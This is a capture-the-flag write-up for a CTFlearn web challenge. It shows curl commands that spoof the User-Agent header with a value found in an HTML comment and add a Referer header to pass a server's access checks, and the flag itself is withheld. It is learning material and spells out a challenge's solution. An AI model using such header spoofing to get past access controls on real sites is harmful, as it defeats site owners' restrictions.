# DON'T BUMP YOUR HEAD(ER)

LINK : https://ctflearn.com/problems/109

# My Approach
- Open http://165.227.106.113/header.php in browser
- Copied as curl 

```sh
$ curl 'http://165.227.106.113/header.php' -H 'Connection: keep-alive' -H 'Pragma: no-cache' -H 'Cache-Control: no-cache' -H 'Upgrade-Insecure-Requests: 1' -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8' -H 'Accept-Encoding: gzip, deflate' -H 'Accept-Language: en-GB,en-US;q=0.9,en;q=0.8' --compressed

Sorry, it seems as if your user agent is not correct, in order to access this website. The one you supplied is: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36
<!-- Sup3rS3cr3tAg3nt  -->
```

- Then I removed User-Agent entirely, Still same error
- Next I tried User-Agent *, Still same error
- Oh, realised Sup3rS3cr3tAg3nt in Output. Let's try that 

```sh
$ curl 'http://165.227.106.113/header.php' -H 'Connection: keep-alive' -H 'Pragma: no-cache' -H 'Cache-Control: no-cache' -H 'Upgrade-Insecure-Requests: 1'  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'  -H 'Accept-Language: en-GB,en-US;q=0.9,en;q=0.8' -H 'User-Agent: Sup3rS3cr3tAg3nt'

Sorry, it seems as if you did not just come from the site, "awesomesauce.com".
<!-- Sup3rS3cr3tAg3nt  -->
```

- Now added Referer Header to awesomesauce.com and it's done.

```sh
$ curl 'http://165.227.106.113/header.php' -H 'Connection: keep-alive' -H 'Pragma: no-cache' -H 'Cache-Control: no-cache' -H 'Upgrade-Insecure-Requests: 1'  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'  -H 'Accept-Language: en-GB,en-US;q=0.9,en;q=0.8' -H 'User-Agent: Sup3rS3cr3tAg3nt' -H 'Referer: awesomesauce.com'

YOU WILL GET THE FLAG HERE
```